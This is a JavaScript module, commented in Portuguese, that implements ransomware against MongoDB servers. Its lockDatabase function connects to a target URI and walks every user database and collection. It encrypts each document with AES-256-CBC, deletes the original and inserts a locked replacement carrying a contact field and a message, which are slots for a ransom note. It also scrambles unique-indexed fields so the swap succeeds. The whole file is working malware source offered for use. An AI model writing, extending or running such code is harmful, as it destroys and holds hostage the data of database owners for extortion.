import { MongoClient } from "mongodb";
import crypto from "crypto";

const ALGORITHM = "aes-256-cbc";
const IV_LENGTH = 16;
const UNIQUE_SUFFIX = "GM2373";

function deriveKey(secret) {
  return crypto.createHash("sha256").update(String(secret)).digest();
}

export async function lockDatabase(targetUri, keySecret, message, contactInfo) {
  const KEY = deriveKey(keySecret);
  const client = new MongoClient(targetUri, {
    serverSelectionTimeoutMS: 10000,
  });

  try {
    await client.connect();
    const admin = client.db("admin").admin();
    const { databases } = await admin.listDatabases();

    for (const dbInfo of databases) {
      if (["admin", "local", "config"].includes(dbInfo.name)) continue;

      const db = client.db(dbInfo.name);
      const collections = await db.listCollections().toArray();

      for (const colDef of collections) {
        if (colDef.name.startsWith("system.")) continue;
        const collection = db.collection(colDef.name);

        // --- LÓGICA DE ALTO NÍVEL: MAPEAMENTO DE ÍNDICES ---
        const indexes = await collection.indexes();
        const uniqueFields = indexes
          .filter((idx) => idx.unique && Object.keys(idx.key)[0] !== "_id")
          .map((idx) => Object.keys(idx.key)[0]);

        const documents = await collection
          .find({ locked: { $ne: true } })
          .toArray();

        for (const doc of documents) {
          const id = doc._id;

          // 1. Criptografia do Payload
          const docToEncrypt = { ...doc };
          delete docToEncrypt._id;

          const iv = crypto.randomBytes(IV_LENGTH);
          const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);
          let encrypted = Buffer.concat([
            cipher.update(JSON.stringify(docToEncrypt), "utf8"),
            cipher.final(),
          ]);

          const encryptedString =
            iv.toString("hex") + ":" + encrypted.toString("hex");

          // 2. Construção do documento "vazio" (conforme seu exemplo)
          const lockedDoc = {
            _id: id,
            encrypted_data: encryptedString,
            locked: true,
            contact: contactInfo,
            message: message,
            version: "2.0-dynamic",
          };

          // 3. NEUTRALIZAÇÃO DINÂMICA DE ÍNDICES ÚNICOS
          // Para cada campo que o banco exige ser único (ex: email),
          // nós criamos uma versão ofuscada e preenchemos o original com lixo.
          uniqueFields.forEach((field) => {
            // Salva o original ofuscado (ex: emailGM2373)
            lockedDoc[`${field}${UNIQUE_SUFFIX}`] = doc[field] || "N/A";

            // Preenche o campo original indexado com valor único para não dar E11000
            lockedDoc[field] =
              `locked_${id}_${crypto.randomBytes(3).toString("hex")}`;
          });

          // 4. Execução do Swap
          await collection.deleteOne({ _id: id });
          await collection.insertOne(lockedDoc);
        }
      }
    }
    return true;
  } catch (err) {
    throw new Error(err.message);
  } finally {
    await client.close();
  }
}
